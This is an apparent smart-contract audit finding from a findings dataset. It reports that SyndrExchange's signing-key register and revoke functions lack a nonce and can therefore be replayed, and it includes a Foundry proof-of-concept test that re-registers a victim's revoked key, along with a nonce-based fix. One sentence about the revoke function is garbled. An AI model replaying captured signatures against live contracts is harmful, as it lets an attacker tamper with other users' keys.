# [H] Registering/Revoking of keys susceptible to

## Summary
Severity: High
Contest weight: 0.7902
Dataset id: 20338
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The functions registerSigningKey and revokeSigningKey are susceptible to replay attacks since they don't use nonce. The functions registerSigningKey and revokeSigningKey do not use nonce. Thus previously valid signatures can be submitted again. This makes the revoke function n/src/SyndrExchange.sol#L707-L711 This can be exploited in the following ways:
1. Replay registrations
1. Alice registers key A.
2. Alice revokes key A.
3. Bob takes out the signatures from Alice's transaction from step 1, and submits it, adding key A back into Alice's approved keys list
2. Replay revokes
1. Alice registers key A.
2. Alice revokes key A.
3. Alice re-registers key A.
4. Bob submits revoke transaction with signatures from step 2 and revokes Alice's registered key.
Since a user can mess with the registered/revoked keys of another user, this is classified as high severity. Malicious users can register/revoke keys of other users. This can be recreated with the following POC The POC has 3 steps:
1. Alice registers a key
2. Alice de-registers key
3. Bob reuses tx info to re-register Alice's key
```solidity
function test_ATTACKreplay() public {
    // 1. Alice registers key
    expiresAt = block.timestamp + 10 days;
    SigUtils.RegisterSigningKey memory registerSigningKey = SigUtils.RegisterSigningKey({key: signingKey, expiresAt: expiresAt});
    bytes32 digest = sigUtils.getRegisterKeyTypedDataHash(registerSigningKey);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(mainAccountPK, digest);
    bytes memory mainAccountSig = sigUtils.fromVRS(v, r, s);
    SigUtils.SignKey memory signKey = SigUtils.SignKey({account: mainAccount});
    bytes32 digest2 = sigUtils.getSignKeyTypedDataHash(signKey);
    (v, r, s) = vm.sign(signingKeyPK, digest2);
    bytes memory signingKeySig = sigUtils.fromVRS(v, r, s);
    bool isValidKey;
    isValidKey = syndrExchange.isValidSigningKey(mainAccount, signingKey);
    assertEq(isValidKey, false);
    vm.expectEmit(true, true, true, true);
    emit RegisteredSigningKey(mainAccount, signingKey, expiresAt);
    syndrExchange.registerSigningKey(signingKey, expiresAt, signingKeySig, mainAccountSig);
    AccountData.SigningKey[] memory skeys = syndrExchange.getSigningKeys(mainAccount);
    assertEq(skeys.length, 1);
    // 2. Alice de-registers key
    SigUtils.RevokeSigningKey memory signKey2 = SigUtils.RevokeSigningKey({key: signingKey});
    digest = sigUtils.getRevokeSigningKeyTypedDataHash(signKey2);
    (v, r, s) = vm.sign(mainAccountPK, digest);
    bytes memory signingKeySig2 = sigUtils.fromVRS(v, r, s);
    vm.expectEmit(true, true, true, true);
    emit RevokedSigningKey(mainAccount, signingKey);
    syndrExchange.revokeSigningKey(signingKey, signingKeySig2);
    skeys = syndrExchange.getSigningKeys(mainAccount);
    assertEq(skeys.length, 0);
    // 3. Replay registration
    syndrExchange.registerSigningKey(signingKey, expiresAt, signingKeySig, mainAccountSig);
    skeys = syndrExchange.getSigningKeys(mainAccount);
    assertEq(skeys.length, 1);
}
```

## Recommendation
Use nonce in the message signature, similar to how nonce is used in withdrawal signatures.
```solidity
bytes32 digest = _hashTypedDataV4(
    keccak256(
        abi.encode(
            keccak256(
                "RegisterSigningKey(address key,uint256 expiresAt)"
            ),
            signingKey,
            expiresAt,
            _useNonce(account)
        )
    )
);
```
